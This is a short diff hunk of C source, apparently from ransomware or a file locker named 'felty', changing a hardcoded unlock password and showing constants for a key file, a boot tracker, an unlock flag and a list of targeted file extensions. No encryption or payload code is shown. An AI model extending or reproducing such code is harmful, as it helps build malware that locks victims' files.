@@ -29,7 +29,7 @@
 #define TRACKER_FILE     L"felty_boot_tracker.dat"
 #define KEY_FILE         L"key.eky"
 #define UNLOCK_FLAG      L"C:\\felty_unlocked.txt"
-#define PASSWORD         L"felty-unlock"
+#define PASSWORD         L"FELTY-RECOVER-2025"
 
 /* ===================== TARGET EXTENSIONS ===================== */
 static const wchar_t *exts[] = {
